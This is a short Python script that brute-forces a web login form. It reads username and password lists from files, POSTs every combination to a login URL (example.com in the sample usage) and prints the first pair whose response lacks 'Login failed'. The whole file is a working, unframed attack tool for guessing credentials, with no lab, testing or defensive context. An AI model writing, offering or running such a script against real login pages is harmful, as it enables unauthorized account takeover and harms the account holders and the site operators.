import requests

def brute_force_login(url, username_file, password_file):
    # Read username and password lists from files
    with open(username_file, 'r') as uf:
        usernames = uf.read().strip().splitlines()

    with open(password_file, 'r') as pf:
        passwords = pf.read().strip().splitlines()

    # Iterate over each username and password combination
    for username in usernames:
        for password in passwords:
            # Create a session object
            session = requests.Session()

            # Prepare login data
            login_data = {
                'username': username,
                'password': password,
                'submit': 'login'
            }

            # Send POST request to login URL
            response = session.post(url, data=login_data)

            # Check if login was successful based on response
            if 'Login failed' not in response.text:
                print(f"Login successful with username: {username} and password: {password}")
                return

    print("Login failed. Credentials not found.")

if __name__ == "__main__":
    # Example usage:
    url = 'https://example.com/login'
    username_file = 'usernames.txt'  # Replace with your usernames file path
    password_file = 'passwords.txt'  # Replace with your passwords file path

    brute_force_login(url, username_file, password_file)
